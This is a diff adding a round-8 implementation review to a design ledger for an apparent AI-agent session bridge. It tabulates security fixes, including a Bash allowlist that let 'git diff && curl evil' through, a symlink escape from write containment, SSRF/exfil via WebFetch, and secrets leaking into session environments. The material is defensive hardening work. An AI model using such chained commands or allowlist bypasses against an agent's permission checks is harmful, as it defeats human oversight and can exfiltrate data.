@@ -271,6 +271,55 @@ queue's rows), threads never expand inline, S5 rail replaces the context panel,
 `serveStatic` traversal-safe, all `execFileSync` array-form, CI runs the app
 lane.
 
+## Round 8: Phase 2 implementation review (2026-08-27)
+
+Three reviewers: plan/spec fidelity (×2, run independently) and a combined
+intent-baseline + security-posture pass (this phase opens the write/session
+attack surface). Every finding verified against the code before folding.
+
+**A process note first.** One fidelity fork, dispatched read-only, observed the
+working tree mid-fold (this session was applying the other reviewers' fixes) and
+misread those in-flight edits as "unauthorized" and the round-8 provenance notes
+as "fabricated". They are neither: the edits are this session's own review folds,
+made under the rules of engagement ("fold confirmed fixes"), and **round 8 is the
+correct ledger number** — rounds 6 and 7 were Phases 0 and 1. No revert; the
+observation is recorded here for the audit trail. Review forks stayed read-only;
+the main session did the edits.
+
+**Security defects (all fixed, with tests):**
+
+| # | Finding | Fix |
+|---|---|---|
+| S8-1 | **CRITICAL** — the Bash allowlist was a naive `startsWith`; `git diff && curl evil` passed | `bashCommandAllowed`: rejects command/process substitution, splits on every shell control operator, requires EVERY segment allowlisted; injection-vector tests |
+| S8-2 | `WebFetch` unconditionally allowed though no skill declares it (SSRF/exfil) | Removed from the canUseTool allow set — denied by default |
+| S8-3 | Write/Edit containment was lexical only — a symlinked component escaped (round-7 P1-3 unmirrored to the write path) | `writeWithinProject` realpaths the deepest existing ancestor; `notebook_path` covered; symlink-escape test |
+| S8-4 | Bearer token compared with `===` (timing side-channel) | `crypto.timingSafeEqual` |
+| S8-7 | The generated allowlist's Write/Edit entries were dead code — the "one generated allowlist" story overclaimed for file tools | Allowlist is Bash-only; file/read basics named in canUseTool; comments corrected |
+| S8-8 | The full bridge env (non-Anthropic secrets) rode into every session and persisted to the journal | `sessionEnv` redacts secret-shaped vars, keeps ANTHROPIC_* |
+
+Hardening also folded: origin-check duplication on `/replay/step` removed (single-sourced in auth.ts); the broad-localhost origin trust is documented as accepted for the local prototype (Phase 6's OAuth narrows it).
+
+**Fidelity/intent defects (fixed, with tests):**
+
+| # | Finding | Fix |
+|---|---|---|
+| F8-1 | Batch-screen cards showed no findings — the `DISPLAY: finding batch` was discarded | detectAsk pairs the sibling DISPLAY into context; new `BatchScreenCard` renders findings above the approve/veto row (queue overlay + thread) |
+| F8-2 | `MENU: cancel gate` (work-unit/topic cancel) wasn't never-auto — a misclick cancelled a unit | Added to `NEVER_AUTO_SURFACES`; `confirmMode` now scans context text too; the dead `/cancel .*--cascade/` regex fixed |
+| F8-3 | Prompt-fallout didn't flip health to `errored` | Sets errored on denial; preserved past a trailing pass-through, cleared by a real gate |
+| F8-4 | Read-only-mirror banner never surfaced in the SPA | `causesFromHealth` derives it from `bannerReasons` |
+| F8-7 | Injected answer turns weren't tagged with the gate id | `gateId` on the user journal record + schema |
+| F8-8 | `out-of-scope-bank` durable queue kind unimplemented | durable.ts scans review items' `out_of_scope` |
+| F8-13 | `SURFACE_GATE_TYPES` omitted incoherence-held-doc / resurface-gate | Both added, plus cancel/signoff |
+| F8-16 | `stale-source` scanned only `sources.*`, not `consult_references.*` | Both scanned |
+| I8-1 (N3) | A truncated/malformed menu classified as `stop-notice` (a card), not pass-through | detectAsk routes option-markup-that-failed-to-parse to pass-through |
+| I8-2 (N1) | The lease wrote into `.workflows/.cache` (in-tree, leakable to fixtures) | Moved out of tree to a deterministic `~/.cache/workflow-bridge/{slug-hash}/lease`; spec 2 amended |
+
+**Gaps closed:** one-live-session-per-address enforced bridge-side (not just in the SPA); the 4h idle-timeout sweep; `buildOrderPos` populated from the epic's spec `order` and joined in the queue; the NEEDS YOU lobby strip (P2); channel thread rows link to their session (S4); the `bridge record-moment` recorder (spec 4's Phase 2 snapshot half — the journals were always teed; this pairs one with a world snapshot); a visible `resuming…` state for answer-while-dead; `BASE_BASH` gained the spec-named cache `rm`/`mv`; allowlist and policy test lanes added; an n=2 restart test.
+
+**Accepted as-is (recorded, not fixed):** adopt-from-replay stays `[spike]` per spec 2; the continue-row two-turn entry mode is the deliberate "session's own start overview carries the routes — no second routing source" choice; `walk-raise` detection waits with the consult surfaces (prose-rendered, no engine section to key on); the `ended` short-circuit in detectAsk is a harmless guard (the pipeline always passes `ended:false`); "WS handshake" in the plan text is stale terminology — the transports are SSE+HTTP and correctly auth-gated; the `detected` gate state is a schema value the machine never dwells in. The broad-localhost origin allowlist is an accepted prototype posture.
+
+**Survived attack:** zero writes into `.workflows/` from the session/gate/API path (answers are only SDK resume turns); the journal-is-source / ledger-is-audit separation; gate identity and its resume-invariance; the answer mutex (two-tab race → one injection, visible resolved-externally); the lease's atomic O_EXCL with no TOCTOU; every mutation and the event stream token-gated behind the Host/Origin boundary; no ping anywhere (Phase 3 boundary holds); no activity theater; React-escaped rendering (no XSS in the new surfaces). The surface sweep test pins `NEVER_AUTO_SURFACES` over every `AUTO_OVERRIDE_LINE` site in the live engine.
+
 ## Rejected / amended findings
 
 - Sufficiency's "SQLite schema has no consumers in Phase 0 — defer it": **rejected** in
